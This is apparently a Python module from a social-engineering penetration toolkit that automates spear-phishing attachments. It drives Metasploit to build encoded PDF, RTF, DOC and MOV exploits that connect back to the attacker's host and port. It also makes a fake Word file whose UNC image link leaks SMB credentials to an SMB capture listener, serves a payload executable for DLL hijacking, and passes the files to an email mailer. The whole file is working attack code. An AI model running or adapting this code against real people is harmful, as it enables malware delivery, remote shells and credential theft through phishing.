#!/usr/bin/python
## PDF spear phishing attack here

import subprocess
import re
import sys
import os
import socket
import pexpect
import time
from src.core.setcore import *
from src.core.dictionaries import *
from src.core.menu.text import *

me = mod_name()
definepath=os.getcwd()
define_version = get_version()
users_home = os.getenv("HOME")

# metasploit path 
meta_path=meta_path()

# define if we need apache or not for dll hijacking
# define if use apache or not
apache=0

# open set_config
apache_check=file("%s/config/set_config" % (definepath),"r").readlines()

# loop this guy to search for the APACHE_SERVER config variable
for line in apache_check:
    # strip \r\n
    line=line.rstrip()
    # if apache is turned on get things ready
    match=re.search("APACHE_SERVER=ON",line)
    # if its on lets get apache ready
    if match:
        for line2 in apache_check:
            # set the apache path here
            match2=re.search("APACHE_DIRECTORY=", line2)
            if match2:
                line2=line2.rstrip()
                apache_path=line2.replace("APACHE_DIRECTORY=","")
                apache=1

###################################################
#        USER INPUT: SHOW PAYLOAD MENU            #
###################################################   
inputpdf=""
target=""
exploit = "INVALID"
while exploit == "INVALID":
    debug_msg(me,"printing 'src.core.menu.text.create_payloads_menu'",5)
    show_payload_menu1 = create_menu(create_payloads_text, create_payloads_menu)
    exploit = raw_input(setprompt(["4"], ""))
    print "\n"

    # Do conditional checks for the value of 'exploit', which should be a number
    # Handle any additional tasks before doing the dictionary lookup and
    # converting the user returned value to the metasploit string
    # here we specify if its a pdf or rtf

    if exploit == 'exit':
        exit_set()

    if exploit == "":
        exploit='1'        # 'SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)'

    if exploit == '3':     #'Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow'
        outfile=("template.doc")

    if exploit == '4':     #'Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)' 
        outfile=("template.rtf")
        target=("TARGET=1")

    if exploit == "5":
        outfile = ("template.mov")

    if exploit != '3' and exploit != '4' and exploit !="17": 
        outfile=("template.pdf")


    debug_msg(me,'current input was read as: %s' % exploit,3)
    exploit=ms_attacks(exploit)
    debug_msg(me,'value was translated to: %s' % exploit,3)

    if exploit == "INVALID":
        print_warning("that choice is invalid...please try again or press ctrl-c to Cancel.")
        time.sleep(2)

# 'exploit' has been converted to the string by now, so we need to
#  evaluate the string instead of the user input number from here on... 
if exploit == "exploit/windows/fileformat/adobe_pdf_embedded_exe" or exploit == "exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs":
    print_info("Default payload creation selected. SET will generate a normal PDF with embedded EXE.")
    print """
    1. Use your own PDF for attack
    2. Use built-in BLANK PDF for attack\n"""
    
    choicepdf = raw_input(setprompt(["4"], ""))
    
    if choicepdf == 'exit':
        exit_set()
    
    if choicepdf == '1':
        # define if user wants to use their own pdf or built in one
        inputpdf=raw_input(setprompt(["4"], "Enter path to your pdf [blank-builtin]"))
        # if blank, then default to normal pdf
        if inputpdf == "":
            # change to default SET pdf
            print_info("Defaulting to BLANK PDF built into SET...")
            inputpdf="INFILENAME=src/core/msf_attacks/form.pdf"
        # if no file exists defalt this
        if not os.path.isfile(inputpdf):
            print_warning("Unable to find PDF, defaulting to blank PDF.")
            inputpdf="INFILENAME=src/core/msf_attacks/form.pdf"
        # if pdf exists, we are good
        if os.path.isfile(inputpdf):
            inputpdf="INFILENAME="+inputpdf

    if choicepdf == '2':
        inputpdf="INFILENAME=src/core/msf_attacks/form.pdf"

    if choicepdf == "":
        inputpdf="INFILENAME=src/core/msf_attacks/form.pdf"

exploit_counter=0

if exploit == "dll_hijacking" or exploit == "unc_embed":
    exploit_counter=1

if exploit_counter == 0:
    
    ###################################################
    #        USER INPUT: SHOW PAYLOAD MENU 3          #
    ###################################################   
    debug_msg(me,"printing 'src.core.menu.text.payload_menu_3'",5)
    show_payload_menu3 = create_menu(payload_menu_3_text, payload_menu_3)
    payload=raw_input(setprompt(["4"], ""))
    noencode=0
    
    if payload == 'exit':
        exit_set()
    
    if payload == "" : payload="2" 
    if payload == '4' or payload == '5' or payload == '6':
        noencode=1
 
    payload=ms_payload_3(payload)
    

    # imported from central, grabs ip address
    rhost=grab_ipaddress()

    # SET LPORT
    lport=raw_input(setprompt(["4"], "Port to connect back on [443]"))

    # if blank default to 443
    if lport == "":
        lport="443"
        print_info("Defaulting to port 443...")

    # SET FILE OUTPATH
    # /root/.msf4/local/msf.pdf
    filename_code = outfile
    outpath=(users_home + "/.msf4/local/" + outfile)
    print_info("Generating fileformat exploit...")
    # START THE EXE TO VBA PAYLOAD
    if exploit != 'custom/exe/to/vba/payload':
        outfile = "%s/src/program_junk/%s" % (definepath,outfile)
        subprocess.Popen("ruby %s/msfcli %s PAYLOAD=%s LHOST=%s LPORT=%s OUTPUTPATH=%s FILENAME=%s %s ENCODING=shikata_ga_nai %s E" % (meta_path,exploit,payload,rhost,lport,outpath,outfile,target,inputpdf), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
        subprocess.Popen("cp " + users_home + "/.msf4/local/%s src/program_junk/" % (filename_code), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
        print_status("Payload creation complete.")
        time.sleep(1)
        print_status("All payloads get sent to the %s directory" % (outfile))
    if exploit == 'custom/exe/to/vba/payload':
        # Creating Payload here
        # if not 64 specify raw output and filename of vb1.exe
        if noencode == 0:
            execute1=("R")
            payloadname=("vb1.exe")
        if noencode == 1:
            execute1=("X")
            payloadname=("vb.exe")
        subprocess.Popen("ruby %s/msfpayload %s %s %s ENCODING=shikata_ga_nai %s > src/program_junk/%s" % (meta_path,payload,rhost,lport,execute1,payloadname), shell=True).wait()
        if noencode == 0:
            subprocess.Popen("ruby %s/msfencode -e x86/shikata_ga_nai -i src/program_junk/vb1.exe -o src/program_junk/vb.exe -t exe -c 3" % (meta_path), shell=True).wait()
        # Create the VB script here
        subprocess.Popen("%s/tools/exe2vba.rb src/program_junk/vb.exe src/program_junk/template.vbs" % (meta_path), shell=True).wait()
        print_info("Raring the VBS file.")
        subprocess.Popen("rar a src/program_junk/template.rar src/program_junk/template.vbs", shell=True).wait()

    # NEED THIS TO PARSE DELIVERY OPTIONS TO SMTP MAILER
    filewrite=file("src/program_junk/payload.options","w")
    filewrite.write(payload+" "+rhost+" "+lport)
    filewrite.close()
    if exploit != "dll_hijacking":
        if not os.path.isfile("src/program_junk/fileformat.file"):
            sys.path.append("src/phishing/smtp/client/")
            debug_msg(me,"importing 'src.phishing.smtp.client.smtp_client'",1)
            try: reload(smtp_client)
            except: import smtp_client

# start the unc_embed attack stuff here
if exploit == "unc_embed":
    rhost=grab_ipaddress
    import string,random
    def random_string(minlength=6,maxlength=15):
        length=random.randint(minlength,maxlength)
        letters=string.ascii_letters+string.digits
        return ''.join([random.choice(letters) for _ in range(length)])
    rand_gen=random_string()
    filewrite=file("src/program_junk/unc_config", "w")
    filewrite.write("use server/capture/smb\n")
    filewrite.write("exploit -j\n\n")
    filewrite.close()
    filewrite=file("src/program_junk/template.doc", "w")
    filewrite.write(r'''<html><head></head><body><img src="file://\\%s\%s.jpeg">''' %(rhost,rand_gen))
    filewrite.close()
    sys.path.append("src/phishing/smtp/client/")
    debug_msg(me, "importing 'src.phishing.smtp.client.smtp_client'",1)
    try: reload(smtp_client)
    except: import smtp_client

# start the dll_hijacking stuff here
if exploit == "dll_hijacking":
    sys.path.append("src/core/payloadgen")
    debug_msg(me, "importing 'src.core.payloadgen.create_payloads'",1)
    try: reload(create_payloads)
    except: import create_payloads

    sys.path.append("src/webattack/dll_hijacking")
    debug_msg(me, "importing 'src.webattack.dll_hijacking.hijacking'",1)
    try: reload(hijacking)
    except: import hijacking

    # if we are not using apache
    if apache == 0:
        if not os.path.isfile("%s/src/program_junk/fileformat.file" % (definepath)):
    #        try:
                filewrite=file("src/program_junk/attack_vector","w")
                filewrite.write("hijacking")
                filewrite.close()
                filewrite=file("src/program_junk/site.template","w")
                filewrite.write("TEMPLATE=CUSTOM")
                filewrite.close()
                time.sleep(1)
                subprocess.Popen("mkdir src/program_junk/web_clone;cp src/html/msf.exe src/program_junk/web_clone/x", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                child=pexpect.spawn("python src/html/web_server.py")
    #        except: child.close()
    # if we are using apache    
    if apache == 1:
        subprocess.Popen("cp src/html/msf.exe %s/x.exe" % (apache_path), shell=True).wait()

    if os.path.isfile("src/program_junk/meta_config"):
        # if we aren't using the infectious method then do normal routine
        if not os.path.isfile("%s/src/program_junk/fileformat.file" % (definepath)):
            print_info("This may take a few to load MSF...")
            try:
                child1=pexpect.spawn("ruby %s/msfconsole -L -n -r src/program_junk/meta_config" % (meta_path))
            except: 
                try:
                    child1.close()
                except: pass

    # get the emails out
    # if we aren't using the infectious method then do the normal routine
    if not os.path.isfile("%s/src/program_junk/fileformat.file" % (definepath)):
        sys.path.append("src/phishing/smtp/client/")
        debug_msg(me, "importing 'src.phishing.smtp.client.smtp_client'",1)
        try: reload(smtp_client)
        except: import smtp_client
        try:
            child1.interact()
        except: 
            if apache == 0:
                try:
                    child.close()
                    child1.close()
                except: pass
